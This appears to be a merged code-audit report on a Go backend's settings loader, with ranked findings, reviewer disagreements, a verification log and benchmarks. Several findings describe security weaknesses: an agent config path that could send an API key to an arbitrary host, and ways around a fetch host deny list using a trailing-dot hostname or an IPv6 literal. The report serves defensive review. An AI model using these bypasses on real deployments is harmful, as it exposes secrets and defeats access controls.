- `loadSubagentFolder` stats the file, `os.ReadFile`s it for `orderedObjectKeys` (`native_subagent_dir.go:116,126`) and then calls `readSessionObject(settingsPath)` at `:120`, which re-opens, re-reads and re-parses the same path before the values are used. Three syscalls and two parses per folder per settings load, and the allow-list check consumes the **first** read while every value comes from the **second** — an editor save between them can honour a key the check did not see.
- severity low. Fix (S): decode the bytes once and pass them on.

### P2A-19 (low, D) `Tools` is documented as read-only — r4-03 — **confirmed**
- the field comment reads "Tools names the read-only native tools the child may use" (`native_subagent_settings.go:183-186`), while `SubagentChangeTools` deliberately accepts `write`, `edit`, `bash`, `exec`, `process` and `ChangesFiles` exists to detect them (`:159,649-660`), and a persistence test pins that a change tool is accepted and marks the agent (`native_subagent_persist_test.go:75-86`, per r4).
- severity low: a wrong capability contract at the settings type, not a runtime defect. It is adjacent to P2A-04 but a different fix (comment vs list).

### P2A-20 (low, A) The headless timeout is not bounded — r3-06 — **confirmed**
- `TimeoutMS > MaxTimeoutMS` is refused (`native_request_draft_settings.go:78-80`) but `HeadlessAutoAcceptTimeoutMS` is only bounded by the constant maximum (`:72-77`), so `{"timeout_ms":1000,"max_timeout_ms":1000,"headless_auto_accept_timeout_ms":1800000}` loads and the headless path (`tools/native/request_draft.go:99`) waits 1800x the advertised maximum. The default `max_timeout_ms` (1,800,000) cannot exhibit it, so an explicit small value is needed.
- severity low (config trap, no data effect). Fix (S): one more comparison beside the existing rule.

### P2A-21 (low, D) `process.env_deny` does not trim — r3-08 — **confirmed**
- bash/exec/tool_smith do `name = strings.TrimSpace(name)` before the pattern check (`native_bash_settings.go:287-305`, in `normalizeChildEnvironment`); the inline process reader checks the raw value (`native_process_settings.go:216-229`). `{"env_deny":[" FOO"]}` therefore loads for the first three and fails for `process`. `env` keys reject without trim in **both**, so the asymmetry is `env_deny` only.
- severity low. Fix (S): share `normalizeChildEnvironment`, or trim in the process branch.

### P2A-22 (low, D) Test gaps — r1-14 — **confirmed with one correction**
- (a) the async bad-input table has no day-key upper bound and no `stop_wait_ms`/`latest_scan_max_bytes` boundary (`native_async_settings_test.go:57-88` has "negative retention" and `keep_finished: 99999999999` only) — P2A-01 would be caught by one row.
- (b) no test where an agent lists `tool_smith`/`subagent` with `paths` (P2A-04); (c) no duplicated-inline-name case (P2A-15); (d) no non-regular `prompt_documents` case (P2A-03); (e) no 129-character `sessions` glob case.
- **correction to (f):** r1 says the key-agreement test covers "exec, read_image, bash, profile_message, tool_smith, transcript, transcripts but not async, subagent, task, memory, fetch, process". The table also covers `read`, `write`, `edit`, `glob`, `grep`, `process` and `decide_systemone` (`native_tool_schema_test.go:47-56`, tool names extracted in this merge); `fetch` and `subagent` have their own key tests (`TestFetchSchemaListsTheKeysTheLoaderAccepts`, `TestSubagentSchemaAndLoaderAgree`). The real gap is **async, task, memory, skill, request_draft**: a key added to those allow-lists without the schema passes CI.

## 5. Contradictions, disagreements and refuted "sound" claims

Both positions are recorded; the source decides.

### C1 (factual) r1's sound-list versus r2/r3/r4 on nested `statecontext` keys — **r1 refuted**
- r1 §6: "Every one of the 21 normalizer sections reads ... rejects unknown keys by name; sub-objects (`statecontext`, `paths`, `stdout`/`stderr`, `spill`, exec `langs`) also reject unknown keys", and its hypothesis T09 records "unknown keys silently ignored somewhere — disproved for all 21 sections read".
- source: `process` and `task` `statecontext` and every `memory` selector have **no** unknown-key loop (`native_process_settings.go:272-313`, `native_task_settings.go:172-213`, `native_memory_settings.go:239-300`), while `subagent` does (`native_subagent_settings.go:380-384`); the schema's `additionalProperties` confirms the split. r2's loader probe and r3's/r4's reads agree, independently.
- **resolution: r1's claim is refuted.** Note that r1's T09 is about *section* level, where it is true, and its sentence lists `statecontext` explicitly, where it is false. P2A-05. This is the phase's single shared blind spot: the reviewer with the most reproductions is the only one that got a nested-key claim wrong.

### C2 (factual, partial) r2's sound-list versus its own P2A-R2-02 — **partly refuted**
- r2 §6: "Key parity schema ↔ loader: all 20 sections match key for key, including the nested `$defs` (`bash_style` → `child_process_style`, `spill`, `agents.<name>`, `paths.allow/deny`), computed by script" and "No dead and no unreachable key: every allow-listed key is read ... and every key read from a section object is allow-listed".
- source: both statements are true at **section** level and for the `$defs` it names, but not for every nested object: `memory.statecontext.items` refuses `exclude_any` (`additionalProperties: false`, no such property) which the loader reads and a loader test uses. So one read key is unreachable from any schema-valid document, and the nested parity claim does not cover it.
- **resolution: r2's own finding stands; the sound-list overstates its scope**, exactly as its §3 P2A-R2-02 says ("no test compares a `minimum`/`maximum`, a nested-object key set, or a nested default"). P2A-06.

### C3 (factual) r3's sound-list versus its own P2A-R3-05 — **partly refuted**
- r3 §6: "`async` validation: the 24 keys, the `1`/`0` minimums per key class, the `_ms`-family cap, `maxNativeAsyncValue = 10_000_000` as a coarse cap, and then `asyncmgr.Config.Validate()` for the 13 cross-field rules — sound", while P2A-R3-05 (same file) reports that the very cap overflows the duration product.
- **resolution: r3-05 stands; "sound" applies to the cross-field rules and the `_ms` caps only.** The day keys' coarse cap is the defect. P2A-01.

### C4 (factual) r4's progress notes versus its own P2A-R4-01 — **superseded within the same file**
- r4 batch 2 first reports "The memory and process normalizers reject unsupported/removed keys, bound configured numeric values, and enforce the observed cross-field constraints" and then, in the same batch note, "do not reject extra nested fields". Its final P2A-R4-01 files the gap.
- **resolution: the first sentence is about the section level and is true there; the nested claim in the second is the finding.** Not a dispute between reviewers, but worth recording because r4's append-only progress notes are easy to misread as the report's conclusions.

### C5 (severity) P2A-05 nested unknown keys — r3 medium vs r2/r4 low
- resolved to **low**: the effect is a silently ignored typo with the documented defaults, bounded by `limit`, with no data or security consequence; the *schema* disagreement is filed separately (P2A-06). R3's medium would apply if a typo could widen an exposure, and none does.

### C6 (severity) P2A-07 duplication — r1 medium vs r2/r3 low
- resolved to **low** per the median rule and the p1 precedent (N20/N21 rate duplication low). Recorded because r1's argument — that three of this phase's own findings are drift between the copies — is the reason to fix it at all, and drops out of a pure severity count.

### C7 (severity) P2A-01 — p4 low vs r1 medium
- resolved to **medium** (see P2A-01). p4 rated M23 low from a `[read]` trace before its own measurement; the arithmetic and the "documented-valid value" argument both now exist. If the user prefers one severity for M23, this replaces p4's.

### C8 (severity) The departures from the filed rating
- **raised**: P2A-01 low (p4 M23) → medium (documented-valid value destroys unread signals and result files); P2A-03 (r1-06/r4-05 low halves) → one medium item (an entry can kill the process, not just the request).
- **lowered**: P2A-05 medium (r3, twice) → low (C5); P2A-07 medium (r1) → low (C6); P2A-10 medium (r3) → low (a literal-IPv6 entry only, name denies still cover AAAA); P2A-11 medium (r3) → low (the operator can configure `read_image.paths`; which side moves is a decision).
- **kept**: P2A-02 medium (r1; the chain is read-confirmed, the last hop is not executed), P2A-04 medium (r1), P2A-09 medium (r1).

## 6. Reviewer-pair agreement

Counts are merged findings co-filed by both reviewers.

| pair | agreed | ids |
|---|---|---|
| r1–r2 | 2 | P2A-07 (r2's envelope vs r1's, same cause), P2A-08 (r2-04 with r1-07) |
| r1–r3 | 4 | P2A-01, P2A-07, P2A-08, P2A-12 |
| r1–r4 | 2 | P2A-01, P2A-03 |
| r2–r3 | 3 | P2A-05, P2A-07, P2A-08 |
| r2–r4 | 1 (+1) | P2A-05 (r2 H2 ≈ r4 H02 is a shared hypothesis on the same code, not a finding) |
| r3–r4 | 2 | P2A-01, P2A-05 |

| reviewer | findings | consensus / unique | rated medium / low | own executions | refuted by this merge |
|---|---|---|---|---|---|
| r1 | 14 filings / 13 entries | 5 / 8 | 6 / 8 | yes (`/tmp/r1`: duration arithmetic, FIFO and `/dev/zero` reads, overlay load probes for inline-agent duplicates, `ChangesFiles`, `prompt_documents`, fetch host parse) | the nested-key sound claim (C1) |
| r2 | 6 filings / 6 entries | 4 / 2 | 0 / 6 | yes (`/tmp/r2/bg`: loader + schema probes for the statecontext typos, `null` keys, `exclude_any`, fetch limits) | nothing disproved; its own sound-list overstates nested parity (C2) |
| r3 | 11 filings / 9 entries | 6 / 3 | 4 / 7 | none (read-only; `go vet`, `gofmt -l`, `go build` clean) | nothing disproved; its async "sound" line vs its own finding (C3) |
| r4 | 5 filings / 5 entries | 3 / 2 | 0 / 5 | none (read-only; two targeted `go test -run` runs, exit 0) | nothing disproved; an early progress note corrected inside its own file (C4) |

Reading: r1 produced every medium security item (P2A-02, P2A-09) and the largest share of the verified findings, by building small probes rather than reading only; its one wrong claim is the nested-key sound line, which three other reviewers refuted. r2 is the most accurate on the schema contract (P2A-06, and its own sound-list caveat) and on severity (zero mediums, and none of its findings was lowered). r3 found the two medium items nobody else saw (P2A-10, and the read_image policy contradiction that r2 filed as documentation only) but rated five `[read]` items medium, four of which the median moves down. r4 covered all 24 files through bounded snippets — the thinnest evidence base of the four — and still produced two valid items (P2A-13, P2A-19) and the fourth finder of P2A-05. Consensus was mostly right this time, but on P2A-05 it was also the area where the most thorough reviewer was alone and wrong (C1).

## 7. Prior art handling

- **p4 M23** (`retention_days`/`unread_ttl_days` overflow, low, confirmed there by r1's reproduction): **re-confirmed** at `fbe49a8` by three reviewers and by my own arithmetic; carried as P2A-01 and rated medium (§4). The fix belongs in `native_async_settings.go` **and** `asyncmgr/config.go`; one change should close both ids.
- **F-22** (`sessionfs` type count, `audit_backend.md:212`, closed with no fix): not re-opened. P2A-07 is the bounded instance of *validation code* duplication inside p2a, which F-22 did not cover (r1's and r2's own distinction, verified against the entry).
- **F-26(a-f)** (duplicated helpers in `tools/native`, `99f4517`): different package, not re-raised.
- **p1 N25 / p4 M15** (multi-root spelling): r2's lead that a `profile_message.sessions` glob cannot name `root:session` is the same area; recorded as a cross-phase lead, not a p2a finding (§10).
- **`audit_backend.md` F-25** (cost of adding a tool, fixed `7e524ba`): explains why the envelope is copied per tool; it is prior art for *why* the duplication exists, not a fix for it.
- No filing repeats a fixed item: greps of the prior audits for the phase's keywords return only scope mentions (`env_file` handling deferred to 6b, `layouttest` as cold test support).
- p1 and p4 fixes are assumed in the tree; none of them touches a p2a file (`grep` of both merges: no 2a path).

## 8. Ranked list (severity, then evidence, then finders, then effort)

Evidence order per `audit_plan.md` 6.4: executed > read-confirmed > unmeasured. No critical or high item.

| # | id | sev | evidence | finders | fix | effort |
|---|---|---|---|---|---|---|
| 1 | P2A-02 | medium | read, full chain; last hop not executed | 1 | confine an agent's `model` to the catalog (or to a catalog models dir), and/or restrict `api_key_env` | M |
| 2 | P2A-04 | medium | read (list, tool pool, four consumers) | 1 | add `tool_smith` to the shell list; decide `subagent`/`profile_message` for `ChangeTools` | S-M |
| 3 | P2A-09 | medium | reproduced (Go URL parse) + read | 1 | strip one trailing `.` on both sides; rooted-spelling test row | S |
| 4 | P2A-01 | medium | reproduced arithmetic + read (3 finders) | 3 (+p4 M23) | cap both day keys in loader and `Config.Validate`; schema; boundary rows | S |
| 5 | P2A-03 | medium | read + r1's two probes (FIFO, OOM), not re-run | 2 | one `readConfigTextFile(path, max)` with `Stat` + regular-file check + `LimitReader` | S |
| 6 | P2A-05 | low | read (4 filings) + r2's loader probe | 4 | unknown-key loop in 3 readers; `additionalProperties: false` for the two schema blocks | S |
| 7 | P2A-06 | low | schema re-read programmatically + read | 1 | five schema corrections + extend the parity test to bounds/defaults/nested keys | M |
| 8 | P2A-15 | low | read + r1's overlay probe | 1 | reject a repeated inline agent name | S |
| 9 | P2A-18 | low | read | 1 | decode the `agent.json` bytes once | S |
| 10 | P2A-20 | low | read | 1 | `HeadlessAutoAcceptTimeoutMS <= MaxTimeoutMS` | S |
| 11 | P2A-21 | low | read | 1 | share `normalizeChildEnvironment` (or trim in process) | S |
| 12 | P2A-16 | low | read + r1's overlay probe | 1 | two cross-field rules + test rows | S |
| 13 | P2A-08 | low | read + r2's loader probe | 3 | pick null = absent for the four sites; update the three test tables | S |
| 14 | P2A-13 | low | read (slice index) | 1 | `t.Fatal` on an empty model map | S |
| 15 | P2A-22 | low | read (correction in §4) | 1 | add the missing rows; extend the key-agreement table to async/task/memory/skill/request_draft | S |
| 16 | P2A-10 | low | reproduced (Go URL parse) + read | 1 | accept IPv6 literals in the host lists, or document them as name/IPv4 only | S |
| 17 | P2A-11 | low | read + 2 tests as proof | 2 | correct the comment, or make `read_image` share the read policy (§11) | S |
| 18 | P2A-19 | low | read + 1 test as proof | 1 | correct the `Tools` comment | S |
| 19 | P2A-17 | low | read | 1 | move the agent build to `native_subagent_agent.go`; one `withDefaults` | M |
| 20 | P2A-07 | low | read (grep counts) | 3 (+1) | `nativeSection` + `configuredStorageDir`; keep the types | M |
| 21 | P2A-12 | low | read | 2 | one `writeJSON`; drop `Defaults`; one negative async case | S |
| 22 | P2A-14 | low | read | 1 | reject NUL and cap item length (low value; may be dropped) | S |

Dependency notes for the fix stage: P2A-01 touches `sessionfs` + `asyncmgr` and is the same change as p4 M23; P2A-05, P2A-06, P2A-08 and P2A-22 all touch the schema or a test table and should be one batch (one schema edit, one test edit) to avoid three separate contract commits; P2A-04, P2A-17, P2A-19 and P2A-18 all edit `native_subagent_settings.go`/`native_subagent_dir.go` and can be one batch; P2A-03 and P2A-18 share the file-reading pattern and the same `readConfigTextFile`-style helper; P2A-09 and P2A-10 both edit `nativeFetchHosts` and the tool's host comparison (one change if the user accepts the IPv6 entries). P2A-07 is optional and, if done, should follow the others so the small fixes are not rebased into a large refactor. Nothing here changes `messages.jsonl`: settings validation, `agent.json`/prompt reads, the fetch host comparison and the async prune are all outside the record format, so no `messages-golden-diff` run is implied; the async `Config` bounds (P2A-01) touch record-file lifetime only. Settings changes (P2A-03's cap, P2A-01's bound) follow the config rules: default, schema, `sample/`, DECISIONS.

## 9. Performance hypotheses for the measurement step (deduped; results in §12)

16 raw hypotheses → 5 for measurement. Every entry is `[unmeasured]`; no benchmark was run in this step and none may be — the measurement is a separate serialized step (`audit_plan.md` 6.3). Existing benchmark names were checked in the tree at this HEAD; `new` means it has to be written in a `/tmp` copy.

| id | hypothesis | file:line | workload | benchmark | sources |
|---|---|---|---|---|---|
| PH1 | every settings load re-decodes the shared `tools` and `tools.native` objects once per section (18 × 2 map decodes) and re-tokenises 14 section objects through `orderedObjectKeys` (25 calls in the package) | `session.go:377-497`; each `native_*_settings.go` preamble; `session.go:1224-1250` | one load per session open or stamp change; 1 vs 10 vs 20 enabled sections, all keys set; 200 sessions | existing `BenchmarkLoadSessionConfig` (`settings_load_benchmark_test.go:10`) plus a variant with N sections | r2 H1, r3 H01, r4 H01, r1 H02 |
| PH2 | `agents_dir` costs 3 syscalls and 2 parses per agent folder per load, reads every prompt file whole, and `withSubagentOverrides` is O(agents²) when folders collide | `native_subagent_dir.go:68-161`; `native_settings.go:186-201` | 0 / 30 / 100 folders × (agent.json + prompt.md + 2 documents); 5 folders × 100 agents; 1 MiB documents | new `BenchmarkLoadSessionConfigAgentsDir` (fixture from `layouttest`) | r1 H01, r2 H2, r3 H03, r4 H02 |
| PH3 | external config files are re-read and re-parsed on every load, once per tool that inherits them (bash, exec, process), and prompt/env bytes are unbounded | `native_env_file.go:15-30`; `native_bash_env.go:12-18`; `native_subagent_settings.go:540-576` | bash-only vs bash+exec+tool_smith; `env_file` 1 KiB vs 1 MiB; documents totalling 10 MiB vs 100 MiB | new `BenchmarkNativeSettingsLoadExternalFiles` | r3 H02, r4 H09 |
| PH4 | `memory` statecontext validation splits and regex-checks every filter key of every selector on every load | `native_memory_settings.go:281-309` | 128 selectors (the cap) × 8 filter keys and depth 8 vs a minimal selector | new, or `BenchmarkLoadSessionConfig` with that toolset | r2 H3, r3 H04 |
| PH5 | `normalizeNativeExecLangs` rebuilds the alias `claimed` map (and re-walks the runner table) on every load | `native_exec_settings.go:217-251` | 1 vs 20 runners with aliases | `BenchmarkLoadSessionConfig` with that toolset | r2 H3 (second half) |

Closed without a measurement, with the reason:
- r1 H03 (`containsString` over a key list) — error path only, negligible by inspection.
- r3 H05 (transcript copies the read policy) — r3's own expected value is "slice header only"; the real cost is PH1's re-parse.
- r3 H06 (`unsupportedToolKey` edit distance) — error path, at most one call per load.
- r3 H07 (`withAsync` map copy) — test-only.
- r2 H3's memory half and r3 H04 are the same code → PH4; r1 H02 is PH1's `orderedObjectKeys` half; r1 H01/r4 H02 are PH2's reader half.
- r2 H2's "O(agents²)" and r4 H09's "total bytes" are folded into PH2 and PH3 rather than counted twice.

Suggested order (serialized, relative, `-race` once on `internal/sessionfs` at the end): PH1 first (it is the fixed cost every other hypothesis sits on), then PH3 and PH2 (both disk-bound; PH2's per-folder constants need a real disk), then PH4 and PH5 (both load-time, likely negligible and cheap to close).

## 10. Verification log (what I ran) and repository state

Repo state: `git status --short` before and after: only the pre-existing `M EXECUTOR.md`, `M MASTER.md`, untracked `audit_findings/`, `nodir/`; `git stash list` 0; HEAD `fbe49a8` unchanged. No code, config, `sample/` or git state was changed; the only file written is this one.

Source read in full or in the cited ranges at `fbe49a8` (all under `backend-go/` unless noted): `internal/sessionfs/native_async_settings.go:1-95`, `native_subagent_settings.go:85-215,330-400,440-590,640-670`, `native_subagent_dir.go:19-185`, `native_subagent_paths.go:60-101`, `native_process_settings.go:195-315`, `native_task_settings.go:172-215`, `native_memory_settings.go:110-186,223-310`, `native_fetch_settings.go:26-235`, `native_read_image_settings.go:1-64`, `native_request_draft_settings.go:55-94`, `native_exec_settings.go:280-305`, `native_transcript_settings.go:85-125`, `native_transcripts_settings.go:75-115`, `native_bash_settings.go:285-310,330-360`, `native_bash_env.go:1-40`, `native_env_file.go:1-31`, `layouttest/layouttest.go:25-200,265-360`, `session.go:940-1015,1224-1250`, `internal/asyncmgr/prune.go:70-145`, `config.go:60-131`, `internal/tools/native/fetch.go:380-480`, `read_image.go:55-90`, `image_file.go:19-49`, `subagent.go:100,320-395,450-560`, `subagent_call.go:55-90`, `profile_message.go:270-282`, `tool_smith.go:60-82`, `shell_async.go:110-180`, `internal/app/resolver.go:285-330,460-520`, `app/subagent.go:150-205`, `app/config.go:70-95`, `DECISIONS.md` 303-334, 549, 573-580, 709-713, 726-740; `sample/schemes/setting.schema.json` (programmatic: `tools.native.properties` for 20 sections, `$defs`, `additionalProperties`, `minimum`/`maximum`/`default`, `maxItems`).

Commands (all read-only; exit 0 unless stated):
- `git rev-parse --short HEAD` → `fbe49a8`; `git status --short`; `git stash list`; `git log --all --oneline -- CODEBASE.md` (empty).
- `grep`/`wc` counts: 18 envelope preambles in 18 files; 9 files with the `native: null` guard; 5 `normalizeNative*StorageDir`; 10 files with `unsupportedToolKey` vs 28 `is not supported` sites; 3 copies of the agent/remote name pattern; no `Defaults:` in any `*_test.go`.
- **Executed probe** `/tmp/p2a-merge/dot.go` via `go run dot.go` (exit 0): `Example.COM.` → `"Example.COM."`/`"example.com."`; `[2001:db8::1]` → `"2001:db8::1"`. This is what turns P2A-09 and P2A-10 from `[read]` into reproduced.
- **Overflow arithmetic** computed in `python3` for int64 nanoseconds at 106,751 / 106,752 / 200,000 / 1,000,000 / 10,000,000 days: only the first is positive (9.22e18 ns), the rest wrap negative, i.e. a cutoff in the future (P2A-01).
- Schema inspected programmatically (`python3`, the same `jsonschema` shapes the repo's tests use): the five P2A-06 drifts, plus `additionalProperties` for the four `statecontext` blocks (`process`/`task` true, `subagent`/`memory` false).
- Not run, by design: no benchmark, no `-race`, no full suite, no network, no live `subagent`/`fetch`, no test written in the repository.
- Scratch: `/tmp/p2a-merge/` holds only `dot.go` (kept out of the repo; nothing to remove from the tree).

### 10.1 `CODEBASE.md` (untracked file reported at the repository root)

- **It is not in the tree now.** `ls CODEBASE.md` → "No such file or directory"; `git log --all -- CODEBASE.md` is empty, so it was never committed.
- It did exist during this phase: r1's `git status --short` output at 11:48 records `?? ../CODEBASE.md` (its exec log `.jad/state/.../reviewer0/tools/.async/exec/exec_fe24e334.txt`), and the codebase-memory index for this workspace contains a file record for `<repo>/CODEBASE.md` with `{"extension":".md"}` (0 lines, indexed as a module) — i.e. the indexer walked the tree while the file was there. r2/r3 saw no such line (11:16/11:17) and r4's status line (13:13) has none either, so it existed only inside a short window.
- **Not generated by the MCP server as far as I can tell:** the server binary `/home/www/.local/bin/codebase-memory-mcp` contains no `CODEBASE.md` literal (`strings -n 6 | grep -i CODEBASE` finds only Go string-table fragments `codebaseI/H/L`). It was most likely written by an agent session that was using the codebase-memory tools (the tool that ran the restart loop) — not verified, and no `CODEBASE.md`-writing command appears in the coordinator's own message log.
- **Assessment:** a regenerable overview artifact of the audit tooling, never tracked, of no value to the repository. If it reappears, add `/CODEBASE.md` to `.gitignore` (beside the existing `/.codebase-memory/` and `/.zvec-grep/` entries) rather than tracking or committing it. **I did not delete it** — it is already absent, and per the task constraints I changed no repository file other than this report.

## 11. Coverage gaps, unverified items and decisions

### Coverage gaps
- **r4 read the phase through bounded codebase-memory snippets only**, after its context was compacted repeatedly. It claims all 24 files, but a snippet view can miss a body: its "no defect retained" for `native_bash_env.go`, `native_exec_settings.go`, `native_tool_smith_settings.go` and `native_skill_settings.go` is weaker evidence than r2's and r3's full reads, and it filed nothing about the envelope copies, the schema or the fetch hosts.
- **r1 left sections unread in depth** (`native_glob/grep/mutation/read_image/request_draft/skill/task/memory` beyond the preamble, `native_process_settings.go` bounds, `native_tool_smith_settings.go:178-233`, `native_exec_settings.go:124-216`); r2 and r3 read all 24, so those areas are covered at least twice — except the ones listed next.
- **No finding or sound line discusses**: `native_statecontext_mode.go` (beyond its use), `native_subagent_deny.go` internals, `native_mutation_settings.go` bodies, `native_skill_settings.go` beyond the preamble, `native_glob_settings.go`/`native_grep_settings.go` bounds. r1 explicitly defers them, r2 says "read in full" but files nothing, r3 samples. My merge read them only where a finding touched them.
- **`sample/schemes/agent.schema.json`** (the folder agent contract) was not compared to the loader by anyone except through `TestSubagentSchemaAndLoaderAgree`, which r2 notes compares raw JSON for the inline block. `toolset.schema.json` was checked by r2 only.
- **No reviewer or I ran the suite** (baseline only), no `-race`, no benchmark, no network. No data-race or timing claim in this file is measured.
- **The five upstream consumers of these settings** (`tools/native/*` executors) were read only where a validation decision depends on them (fetch host comparison, `read_image` policy, `subagent` tool pool, `profile_message` `MayChangeFiles`); a setting that is validated but ignored at run time would be a phase 6/7 finding.

### Unverified (stays in the list, flagged) — P2A-02, P2A-03 and P2A-09/P2A-10 were reproduced in §12.4; the rest still stand
- **P2A-02**: the final hop (a real request carrying the secret to an attacker host) was not executed — no network in this step. Everything up to `NewClient{APIKey, BaseURL}` is read-confirmed.
- **P2A-03**: the FIFO block and the `/dev/zero` OOM are r1's measurements, not re-run here (they stall or kill a process by construction); the absence of the checks is read-confirmed.
- **P2A-09 / P2A-10**: the parse and the comparison are reproduced; no live `fetch` was run, so "the request then goes to the denied host" is read (DNS resolving a rooted name to the same addresses).
- **P2A-13**: the panic is read from the slice index, not triggered by a test.
- **P2A-06**: I verified the five drifts the reviewers named; I did not run r2's full 139-call bounds comparison, so an additional drift is possible.
- **P2A-07**: counts are `grep` counts at this HEAD; r1's "18 copies, ~240 duplicated lines" and r2's 19th copy agree with mine.
- None of the 5 performance hypotheses was measured; PH1's absolute cost is the unknown that decides whether PH2-PH5 matter at all.

### Decisions needed from the user
1. **P2A-02 rating and fix shape.** Keep medium, or promote to high after one `httptest` end-to-end test in the fix step? And which fix: a catalog-model-ID-only rule for agents, a containment check on a `.json` model path, or an `api_key_env` allow-list relative to the session's own model? Every option changes the documented "agent folder is self-contained and shareable" behaviour, so it needs a decision.
2. **P2A-04 semantics.** Does `subagent` count as a change tool always, or only when the target agent changes files (which the loader cannot know at load time for a nested folder agent)? Same question for `profile_message` (always changes). The answer decides whether `ChangesFiles` stays a pure function of `Tools`.
3. **P2A-01 / p4 M23.** One fix in both places, and which cap: 36,500 (p4's proposal), 106,751 (the arithmetic limit), or a `time.Duration`-safe helper. Also: medium (this file) or keep p4's low for M23?
4. **P2A-05 schema direction.** For `process`/`task` `statecontext` the schema currently allows extra keys (`additionalProperties: true`) — tighten the schema to match the new loader rule, or leave the schema lax? For `memory` the schema is already strict, so only the loader moves.
5. **P2A-06 which side moves for `fetch.default_limit`/`max_limit`**: lower the schema to 1,000,000, or raise the loader to `maxNativeToolBytes` (which would also move the `max_limit <= max_document_chars` compatibility check)? And: give `exec` its own `spill` block with `default: ".exec-output"`, or drop the shared default?
6. **P2A-07 duplication work now or never.** Two helpers remove ~300 lines across 18 files (M effort, mechanical but wide). Do it as its own commit before or after the small fixes, or record the drift and skip it (F-22 precedent)?
7. **P2A-11 which side moves**: correct the comment (documentation-only) or make `read_image` share the read tool's policy (a behaviour and security change; its own `paths` key would then go away or become an addition)?
8. **P2A-03 cap shape**: a new documented setting (`prompt_documents_max_bytes` / an `env_file_max_bytes`) per the config rules, or one fixed internal ceiling shared by both readers through the `readConfigTextFile` helper (r1's and r4's suggestion, and r1's cross-phase L6 wants the same helper for `readSessionObject`)?
9. **P2A-10**: accept IPv6 literals in `allowed_hosts`/`denied_hosts`, or document the lists as "host names and IPv4 literals" and leave IPv6 to `isPublicFetchAddress`?
10. **Measurement go-ahead** for the 5 hypotheses in §9 — **answered: run in §12**, with one follow-up question left (P2A-02's rating).
11. **`CODEBASE.md`** (§10.1): confirm that a `/CODEBASE.md` `.gitignore` entry is wanted if the file reappears. Nothing to delete now — I did not touch it.

## 12. Measurement results (step 6.3, PH1-PH5) and the three flagged reproductions

*(Same procedure as `p1_merged.md` §13 and `p4_merged.md` §13/§14: serialized, one command at a time, baseline first, statistics from the raw `ns/op` lines.)*

### 12.1 Preconditions and method

- Machine: 12 CPUs (AMD Ryzen 5 3600), go1.27.3 linux/amd64, git 2.56.0, warm build cache, HEAD `fbe49a8` (unchanged). Load average 1.96/1.10/0.74 at the start and 1.62/1.54/1.19 at the end; the machine was **not idle** (a jad backend at ~1 %, a desktop browser), which is why every claim below is a **ratio or a per-item cost**, not an absolute real-time figure.
- **Filesystem used: tmpfs.** `/tmp` is tmpfs (19 GiB, 1 % used); the workspace disk is **btrfs** (`/dev/sda2` on `/home/www/Downloads`, `rw,noatime,compress=zstd:3`, block size 4096). The graded tree was copied byte-identically to `/tmp/p2am/bg` (`rsync -a`, `diff -r` of `internal/sessionfs` against `backend-go/internal/sessionfs` exit 0) and **every measurement and reproduction ran there, in memory**. That is deliberate and sufficient for this phase: none of PH1-PH5 is a disk-throughput question — they read a handful of small JSON/markdown files that are in page cache or on tmpfs, so an fsync/btrfs run would measure the same bytes. The btrfs disk was used only to read the repository. **No `TMPDIR` redirect was needed** (unlike `p1_merged.md` §13.1's H-D/H-J).
- **No repository file was changed.** `git status --short` before and after: only the pre-existing `M EXECUTOR.md`, `M MASTER.md`, untracked `audit_findings/`, `nodir/`; `git stash list` empty; HEAD `fbe49a8`. The only repository file written in this step is this report.
- Scratch files live only in the copy: `internal/sessionfs/p2afixture_test.go` (fixture writer for `testing.TB`), `p2ahelpers_test.go`, `p2abench_ph1_test.go`, `p2abench_ph1decode_test.go`, `p2abench_ph1keys_test.go`, `p2abench_ph2_test.go`, `p2abench_ph3_test.go`, `p2abench_ph3parse_test.go`, `p2abench_ph45_test.go`, `p2abench_ph5langs_test.go`, `p2aprobe_test.go` (config validity probe), `p2a_repro_test.go` (P2A-03, P2A-10); `internal/app/p2a_repro_test.go` (P2A-02); `internal/tools/native/p2a_repro_test.go` (P2A-09). All `gofmt`/`go vet` clean. `/tmp/p2am` is deleted at the end of the step (raw `ns/op` lines were kept in `/tmp/p2am/out/` until then).
- Benchmarks: `go test ./internal/sessionfs/ -run '^$' -bench '<name>' -benchmem -benchtime=0.3s -count=10`, one at a time, n=10 everywhere. **`spread = (max-min)/mean`; > 5 % is marked noisy** (only `documents/2x10MiB` at 12.0 % and two PH5 rows at 7.8-8.4 % are).
- Fixture shape (one per size, reused across the `b.N` loop): a catalog-layout session — root `setting.json`, one model, one toolset `coding/default` whose `native` block holds the sections under test, profile `dev/coder`, session `session-1`. Every configuration was validated once by `TestP2AProbeSections` (all 20 native sections load alone and cumulatively, otherwise the benchmark would have measured an error path).
- Baseline, in the repository (read-only, one command at a time):

| command | exit | wall | result |
|---|---|---|---|
| `go build ./internal/sessionfs/ ./internal/sessionfs/layouttest/` | 0 | 0.04 s | empty |
| `go vet ./internal/sessionfs/ ./internal/sessionfs/layouttest/` | 0 | 0.07 s | empty |
| `gofmt -l internal/sessionfs` | 0 | - | 0 files |
| `go test -count=1 ./internal/sessionfs/ ./internal/sessionfs/layouttest/` | 0 | 0.75 s | `ok sessionfs 0.544s`; `layouttest [no test files]` |
| `go test -race -count=1 ./internal/sessionfs/ ./internal/sessionfs/layouttest/` | 0 | 7.31 s | `ok sessionfs 4.145s`; `layouttest [no test files]`; **no `DATA RACE`** |
| `git diff --check` | 0 | - | empty |

### 12.2 Results by hypothesis

| id | workload measured (n=10) | numbers (median) | per-item cost | verdict |
|---|---|---|---|---|
| PH1 | `BenchmarkP2APH1Sections`: `LoadSessionSettings` and `LoadSessionConfig` with 1 / 3 / 10 / 20 native sections, every section configured (async auto-added) | 1 section **209 µs** (74 KiB, 884 allocs); 3 **238** (79 KiB, 989); 10 **415** (141 KiB, 1633); 20 **577** (206 KiB, 2194). LoadSessionConfig adds 15 µs at every size | 20 sections cost **2.8×** one section; +19.4 µs per added section at the top of the range | **confirmed** (mechanism below); the extrapolated 200-session scan is 42 ms at 1 section and **115 ms** at 20 |
| PH1 (mechanism) | `BenchmarkP2APH1Decode` + `P2APH1SectionKeys`: one `decodeConfigObject` of the shared `tools` and `tools.native` objects, and `orderedObjectKeys` over the section objects, for the same sizes | `tools`: 1.16 / 1.36 / 2.34 / **3.07 µs**; `tools.native`: 0.83 / 1.50 / 4.78 / **8.67 µs**; section-object key scans per load: 0.78 / 2.30 / 10.26 / **15.94 µs** (all spreads 1.9-6.4 %) | see the arithmetic below | **confirmed, with a count correction** |
